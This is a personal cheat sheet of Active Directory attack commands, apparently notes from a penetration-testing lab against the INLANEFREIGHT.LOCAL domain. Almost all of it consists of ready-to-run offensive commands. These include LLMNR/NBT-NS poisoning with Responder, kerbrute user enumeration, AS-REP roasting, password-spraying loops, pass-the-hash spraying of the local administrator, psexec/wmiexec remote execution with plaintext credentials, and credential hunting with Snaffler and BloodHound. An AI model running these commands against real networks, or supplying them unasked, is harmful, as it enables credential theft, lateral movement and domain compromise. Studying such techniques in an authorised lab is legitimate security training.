# enumeration
## hosts and domains
- find hosts
```bash
sudo responder -I ens224 -A
```
or use tcpdump or wireshark
- fping
```bash
fping -asgq 172.16.5.0/23
```
## users
- kerbrute
[ https://github.com/ropnop/kerbrute ](https://github.com/ropnop/kerbrute)
then make all

move to path (echo $PATH then mv there)
```bash
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```
**note: kerbrute doesn't play well with proxychains try using impacket-GetNPUsers instead**
```bash
proxychains impacket-GetNPUsers -dc-ip 10.0.23.101 -no-pass -usersfile test.names -request -outputfile test2.tgs NETW255.LOCAL/ | grep User >> no_preauth_users.log
```
- having a system account is equivalent to having a domain user account because it can impersonate a computer
### RESPONDER
NBT-NS spoofing/ LLMNR poisoning
- NBT-NS netbios resolution
- LLMNR link local multicast Resolution
- when dns fails
```bash
sudo Responder -I eth0
# captured hashes in /usr/share/responder/logs
```
# password policy enumeration
- crackmapexec
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```
- rpcclient
- check for anonymous bind RPC
```bash
rpcclient -U "" -N 172.16.5.5
querydominfo
cat rpc_users.txt | sed -n 's/.*user:\[\(.*\)\] rid:.*/\1/p'
getdompwinfo
``
- lockout times are in 100 nano seconds so 18000000000 is 30 minutes
- enum4linux
- smb null session windows
```powershell
net use \\DC01\ipc$ "" /u:""
# can query using net use like
net use \\DC01\ipc$ "password" /u:guest
```
- authenticated to windows domain host
```cmd
net accounts
```
# ldap
- tools include windapsearch.py, ldapsearch, ad-ldapdomaindump.py
## anonymous binds
## windapsearch
```bash
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```
## ldapsearch
```bash
# pwd len
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
```bash
# anonymous bind get users
ldapsearch -H ldap://172.16.5.5 -x -b "DC=inlanefreight,DC=local" '(objectClass=User)' "sAMAccountName" | grep sAMAccountName
```
- -x (anonymous)
- -H ldap://<ip or hostname>
- -b DC=inlanefreight,DC=local
- uncredentialed scan for objects that do not require a password
```bash
 ldapsearch -x -H ldap://inlanefreight.local -b "dc=inlanefreight,dc=local"     
 "(!(userPassword=*))"
```
## powerview
```bash
Get-DomainPolicy
# password spraying
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
# ADMIN hash spraying
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
## password spray windows
[https://github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)

# credentialed enumeration from linux
```bash
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
queryuser 0x457
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
# credentialed enumeration from windows
import the ActiveDirectory Module
```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"
```
- Powerview

**Command **|**Description**
:-----:|:-----:
Export-PowerViewCSV |Append results to a CSV file
ConvertTo-SID |Convert a User or group name to its SID value
Get-DomainSPNTicket |Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions: | 
Get-Domain |Will return the AD object for the current (or specified) domain
Get-DomainController |Return a list of the Domain Controllers for the specified domain
Get-DomainUser |Will return all users or specific user objects in AD
Get-DomainComputer |Will return all computers or specific computer objects in AD
Get-DomainGroup |Will return all groups or specific group objects in AD
Get-DomainOU |Search for all or specific OU objects in AD
Find-InterestingDomainAcl |Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember |Will return the members of a specific domain group
Get-DomainFileServer |Returns a list of servers likely functioning as file servers
Get-DomainDFSShare |Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions: | 
Get-DomainGPO |Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy |Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions: | 
Get-NetLocalGroup |Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember |Enumerates members of a specific local group
Get-NetShare |Returns open shares on the local (or a remote) machine
Get-NetSession |Will return session information for the local (or a remote) machine
Test-AdminAccess |Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions: | 
Find-DomainUserLocation |Finds machines where specific users are logged in
Find-DomainShare |Finds reachable shares on domain machines
Find-InterestingDomainShareFile |Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess |Find machines on the local domain where the current user has local administrator access
Domain Trust Functions: | 
Get-DomainTrust |Returns domain trusts for the current domain or a specified domain
Get-ForestTrust |Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser |Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember |Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping |Will enumerate all trusts for the current domain and any others seen.

- when you can't use powershell use sharpview
[https://github.com/tevora-threat/SharpView](https://github.com/tevora-threat/SharpView)
- check your .NET version
[https://learn.microsoft.com/en-us/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed#version_table](https://learn.microsoft.com/en-us/dotnet/framework/migration-guide/how-to-determine-which-versions-are-installed#version_table)
```powershell
(Get-ItemPropertyValue -LiteralPath 'HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -Name Release)
```
- snaffler look for shares n creds
```powershell
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```
- bloodhoud w/ Sharphound
.\SharpHound.exe -c All --zipfilename ILFREIGHT
- cipher queries tutorial
[https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

